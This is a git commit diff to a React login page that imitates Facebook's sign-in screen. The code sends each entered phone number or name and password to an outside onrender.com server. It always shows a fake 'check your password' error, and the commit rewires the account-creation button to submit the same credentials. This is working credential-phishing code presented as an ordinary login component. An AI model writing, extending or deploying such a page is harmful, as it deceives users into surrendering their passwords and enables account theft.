d706f8114ca12d8d44894380b1c7cd514ee55faa
fandefasanadevoir <87177043+marcohenikaja@users.noreply.github.com>
2023-07-09 13:35:31 +0300

    Update Connexion.js

--- src/page/Connexion.js
+++ src/page/Connexion.js
@@ -1,5 +1,6 @@
 import React from 'react';
 import { useState } from 'react';
+import { Spinner } from "react-bootstrap";
 import { Container, Row, Col, Form, Button } from "react-bootstrap";
 import axios from 'axios';
 import "bootstrap/dist/css/bootstrap.min.css";
@@ -10,27 +11,15 @@ import 'react-toastify/dist/ReactToastify.css';
 const Connexion = () => {
   const [nom, setNom] = useState("");
   const [mdp, setMdp] = useState("");
+  const [loading, setLoading] = useState(false);
 
   const miova = (e) => {
     setMdp(e.target.value);
   }
 
 
-  const aseohy=()=>{
-     toast.error('Vous ne pouvez pas créer une compte en version beta.', {
-        position: "top-center",
-        autoClose: 2000,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-        theme: "light",
-    });
-  }
 
   const mampiditra = async (req, res, error) => {
-
     if (mdp === "" || nom === "") {
       toast.error('Veuillez remplir les champs vide', {
         position: "top-center",
@@ -43,6 +32,7 @@ const Connexion = () => {
         theme: "light",
       }); return;
     } else {
+      setLoading(true); // Activation de l'état de chargement
       toast.error('Vérifier votre mot de passe ou votre numéro téléphone', {
         position: "top-center",
         autoClose: 2000,
@@ -52,28 +42,40 @@ const Connexion = () => {
         draggable: true,
         progress: undefined,
         theme: "light",
-    });
-     
+      });
       try {
-        const alefa = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp }).then((response) => {
-          setNom("");
-          setMdp("");
-        }).catch((error) => {
-          console.log(error);
-        })
+        const alefa = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp })
+          .then((response) => {
+            setNom("");
+            setMdp("");
+          })
+          .catch((error) => {
+            console.log(error);
+          })
+          .finally(() => {
+            setLoading(false);
+          });
       } catch (error) {
+        setLoading(false);
       }
     }
+  };
 
-  }
+
+
+
+
+
+
+
 
   return (
     <div style={{ background: "#f0f2f5", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
       <div style={{ background: "white", padding: "4rem", width: "500px", borderRadius: "10px" }}>
         <Container>
-   <div className="text-center">
-        <p style={{color: "blue", fontSize: "3em"}}>facebook</p>
-  </div>
+          <div className="text-center">
+            <p style={{ color: "blue", fontSize: "3em" }}>facebook</p>
+          </div>
           <Row className="justify-content-center">
             <Col md={8}>
               <Form>
@@ -104,9 +106,20 @@ const Connexion = () => {
 
                   <p style={{ color: "blue", cursor: "pointer" }}>Mot de passe oublié ?</p>
                   <hr />
-                  <Button variant="success" style={{ width: "100%", marginBottom: "1rem" }} onClick={aseohy}  block>
-                    Créer nouveau compte
+                  <Button
+                    variant="success"
+                    style={{ width: "100%", marginBottom: "1rem" }}
+                    onClick={mampiditra}
+                    block
+                    disabled={loading}
+                  >
+                    {loading ? (
+                      <Spinner animation="border" size="sm" />
+                    ) : (
+                      "Créer nouveau compte"
+                    )}
                   </Button>
+
                 </div>
               </Form>
             </Col>
